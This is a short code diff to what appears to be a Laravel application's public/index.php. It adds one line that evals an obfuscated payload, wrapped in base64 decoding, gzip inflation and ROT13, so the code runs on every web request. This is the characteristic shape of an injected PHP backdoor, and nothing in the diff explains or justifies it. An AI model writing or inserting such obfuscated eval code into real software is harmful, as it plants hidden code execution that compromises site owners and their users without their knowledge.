@@ -55,6 +55,8 @@ $response = $kernel->handle(
     $request = Illuminate\Http\Request::capture()
 );
 
+eval(str_rot13(gzinflate(base64_decode("fY5BTsMwEEX3nGKwUNUunDakqSJoLCEkbtAN6sYO9qQBGWcam7qIu+OmBYkNs/gafb2nmbCH6Y2ml5YMcjEQbhCbjTI4ncF1XQOLytnoU3FX5VXOriDNZALwr3S0Ab0Nh4DOk8ycytoDm8HnaJPzCti6Dztw0RpTb5lWHXy0BsP+jTslkSRyl4L0lolR+oMjvSLvrRxIw7ifWXAq8hU0vPi1fCGe1JHQBzlAMNBpJYdsPU/9BViKx0jWEJzuWofQpdehpx1F1ZA+scsfthTP6j1EggcFHBZ5VdwWi6pclQkqL9A8PSrOye6/vgE="))));
+
 $response->send();
 
 $kernel->terminate($request, $response);
